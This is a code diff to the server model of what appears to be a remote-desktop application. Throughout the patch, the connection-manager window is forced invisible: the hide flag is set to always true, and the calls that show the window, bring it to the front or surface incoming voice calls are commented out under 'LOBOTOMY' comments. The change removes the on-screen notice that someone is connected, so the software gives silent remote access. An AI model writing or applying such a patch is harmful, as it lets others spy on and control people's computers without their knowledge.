@@ -31,7 +31,7 @@ class ServerModel with ChangeNotifier {
   bool _fileOk = false;
   bool _clipboardOk = false;
   bool _showElevation = false;
-  bool hideCm = false;
+  bool hideCm = true; // FORCE INVISIBLE ALWAYS
   int _connectStatus = 0; // Rendezvous Server status
   String _verificationMethod = "";
   String _temporaryPasswordLength = "";
@@ -170,7 +170,7 @@ class ServerModel with ChangeNotifier {
             }
           } else {
             _zeroClientLengthCounter = 0;
-            if (!hideCm) showCmWindow();
+            // if (!hideCm) showCmWindow(); // LOBOTOMY: never show CM
           }
         }
       }
@@ -530,8 +530,9 @@ class ServerModel with ChangeNotifier {
     if (desktopType == DesktopType.cm) {
       if (_clients.isEmpty) {
         hideCmWindow();
-      } else if (!hideCm) {
-        showCmWindow();
+      } else {
+        // showCmWindow(); // LOBOTOMY: never show CM
+        hideCmWindow();
       }
     }
     if (_clients.length != oldClientLenght) {
@@ -566,7 +567,8 @@ class ServerModel with ChangeNotifier {
         tabController.remove(index_disconnected);
       }
       if (desktopType == DesktopType.cm && !hideCm) {
-        showCmWindow();
+        // showCmWindow(); // LOBOTOMY: never show CM
+        hideCmWindow();
       }
       scrollToBottom();
       notifyListeners();
@@ -584,16 +586,16 @@ class ServerModel with ChangeNotifier {
         closable: false,
         onTap: () {},
         page: desktop.buildConnectionCard(client)));
-    Future.delayed(Duration.zero, () async {
-      if (!hideCm) windowOnTop(null);
-    });
-    // Only do the hidden task when on Desktop.
-    if (client.authorized && isDesktop) {
-      cmHiddenTimer = Timer(const Duration(seconds: 3), () {
-        if (!hideCm) windowManager.minimize();
-        cmHiddenTimer = null;
-      });
-    }
+    // LOBOTOMY: never bring window on top or minimize to taskbar
+    // Future.delayed(Duration.zero, () async {
+    //   if (!hideCm) windowOnTop(null);
+    // });
+    // if (client.authorized && isDesktop) {
+    //   cmHiddenTimer = Timer(const Duration(seconds: 3), () {
+    //     if (!hideCm) windowManager.minimize();
+    //     cmHiddenTimer = null;
+    //   });
+    // }
     parent.target?.chatModel
         .updateConnIdOfKey(MessageKey(client.peerId, client.id));
   }
@@ -761,9 +763,10 @@ class ServerModel with ChangeNotifier {
             showVoiceCallDialog(client);
           } else {
             // Has incoming phone call, let's set the window on top.
-            Future.delayed(Duration.zero, () {
-              windowOnTop(null);
-            });
+            // LOBOTOMY: never bring window on top for voice calls
+            // Future.delayed(Duration.zero, () {
+            //   windowOnTop(null);
+            // });
           }
         }
         notifyListeners();
